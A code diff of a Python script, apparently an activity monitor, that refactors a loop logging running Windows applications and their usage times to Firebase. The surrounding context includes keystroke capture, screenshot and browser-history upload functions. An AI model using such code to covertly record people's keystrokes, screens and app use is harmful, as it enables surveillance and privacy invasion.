@@ -34,12 +34,8 @@ def convert_time(timestamp):
     epoch_start = datetime(1601, 1, 1)
     dt_object = epoch_start + timedelta(microseconds=timestamp)
     return dt_object.strftime("%Y-%m-%d %H:%M:%S")
-def convert_time_App(timestamp):
-    epoch_start = datetime(1601, 1, 1)
-    time_difference = timestamp - epoch_start.timestamp()
-    microseconds = time_difference * 1e6
-    dt_object = epoch_start + timedelta(microseconds=microseconds)
-    return dt_object.strftime("%Y-%m-%d %H:%M:%S")
+
+
 def on_press(key):
     try:
         key = str(key)
@@ -79,61 +75,66 @@ def takeScreenshot():
         print("Error: " + str(e))
 
 def getAppHistory():
-    
     # Danh sách lưu trữ các ứng dụng hiện tại và thời điểm mở
     current_apps = {}
+    start_time_dict = {}  # Lưu trữ thời gian mở ứng dụng ban đầu
 
     # Lặp vô hạn
     while True:
         # Lấy danh sách các ứng dụng đang chạy
         running_apps = {process.name(): int(time.time()) for process in psutil.process_iter() if process.name().endswith('.exe')}
-        
+
         # Tìm các ứng dụng mới xuất hiện và tính toán thời gian mở
         new_apps = {app: timestamp for app, timestamp in running_apps.items() if app not in current_apps}
-        
+
         # Tìm các ứng dụng bị đóng lại và tính toán thời gian sử dụng
         for app in current_apps:
             if app not in running_apps:
                 close_time = int(time.time())
-                start_time = current_apps[app]['start-time']
-                
-                # Chuyển đổi start_time và close_time thành định dạng giờ-phút-giây
+                start_time = start_time_dict.get(app, close_time)
+
                 start_time_datetime = datetime.fromtimestamp(start_time)
                 close_time_datetime = datetime.fromtimestamp(close_time)
-                
-                formatted_start_time = convert_time_App(start_time_datetime)
-                formatted_close_time = convert_time_App(close_time_datetime)
-                
+
+
                 usage_time = close_time - start_time
                 print(f"Closed App: {app}, Usage Time: {usage_time} seconds")
-                
+
                 # Cập nhật thời gian mở, đóng và thời gian sử dụng vào Firebase
                 current_date = time.strftime('%Y-%m-%d')
                 date_ref = ref.child(current_date)
                 app_ref = date_ref.child('app_history').push()
-                
+
                 app_ref.update({
                     'app_name': app,
-                    'start-time': formatted_start_time,
-                    'end-time': formatted_close_time,
+                    'start-time': start_time_datetime.strftime("%Y-%m-%d %H:%M:%S"),
+                    'end-time': close_time_datetime.strftime("%Y-%m-%d %H:%M:%S"),
                     'usage-time': usage_time
                 })
-        
+
         # Cập nhật danh sách các ứng dụng hiện tại và thời điểm mở
-        current_apps = {app: {'start-time': timestamp} for app, timestamp in running_apps.items()}
-        
+        current_apps = {app: timestamp for app, timestamp in running_apps.items()}
+        start_time_dict.update(new_apps)  # Cập nhật thời gian mở cho các ứng dụng mới xuất hiện
+
         # Đẩy dữ liệu vào Firebase với ngày hiện tại
         current_date = time.strftime('%Y-%m-%d')
         date_ref = ref.child(current_date)
-        
+
         # Ghi dữ liệu vào Firebase
         for app, timestamp in new_apps.items():
             app_ref = date_ref.child('app_history').push()
-            app_ref.update({'app_name': app, 'start-time': timestamp})
-        
+            timestamp_datetime = datetime.fromtimestamp(timestamp)
+            formatted_timestamp = timestamp_datetime.strftime("%Y-%m-%d %H:%M:%S")
+
+            app_ref.update({
+                'app_name': app, 
+                'start-time': formatted_timestamp
+            })
+
         # Chờ 1 giây trước khi lặp lại để tránh tải nhiều tài nguyên hệ thống
         time.sleep(1)
-
+        
+        
 def push_to_firebase(history_data, browser_type):
     # Lấy ngày hiện tại
     current_date = datetime.now().strftime("%Y-%m-%d")
